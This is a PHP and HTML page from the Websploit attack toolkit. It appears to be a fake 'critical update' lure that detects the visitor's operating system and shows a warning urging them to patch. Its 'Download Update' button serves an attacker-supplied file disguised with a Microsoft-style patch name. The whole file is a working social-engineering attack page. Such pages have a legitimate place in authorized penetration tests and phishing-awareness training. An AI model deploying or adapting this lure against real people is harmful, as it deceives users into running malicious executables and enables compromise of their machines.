<?php
// Idea : g0tmi1k
// Edit & Fixed For Websploit By : 0x0ptim0us

if (stripos($_SERVER['HTTP_USER_AGENT'], 'win') !== FALSE) {
	$OS = "Windows";
} elseif (stripos($_SERVER['HTTP_USER_AGENT'], 'mac') !== FALSE) {
	$OS = "OSX";
} elseif (stripos($_SERVER['HTTP_USER_AGENT'], 'linux') !== FALSE) {
	$OS = "Linux";
} elseif (stripos($_SERVER['HTTP_USER_AGENT'], 'Linux') !== FALSE) {
	$OS = "Linux";
} elseif (stripos($_SERVER['HTTP_USER_AGENT'], 'AppleWebKit') !== FALSE) {
	$OS = "iPhone";
} else {
	$OS = "OSX/Linux";
}

if ($OS == "Linux") {$file="Linux-update-EN-659";}
elseif ($OS == "OSX") {$file="OSX-update-HT3131";}
elseif ($OS == "Windows") {$file="Windows-KB183905-ENU.exe";}
else $file="file://C:/Windows-KB183905-ENU.exe";
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" href="favicon.ico">
<title><?php echo $OS;?> Update</title>
<style type="text/css">
<!--
 h1, p, a, body{
	font-family: Arial, Hevetica, sans-serif;
	font-weight: bold;
	font-size: 24px;
	color: #999999;
}
-->
</style>
</head>
<body>
 <p align="center"><img src="<?php echo $OS;?>.jpg" width="100" height="100" alt="logo logo"><br/><br/>There has been a <u>critical vulnerability</u> discovered in <?php echo $OS;?>.<br />
 It is essential that you patch your system before continuing.<br /><br />
 Sorry for any inconvenience caused.</p><br />
 <p align="center"><input type="button" name="btnDownload" value="Download Update" onclick="window.open('<?php echo $file;?>','download'); return false;"/></p>
</body>
</html>
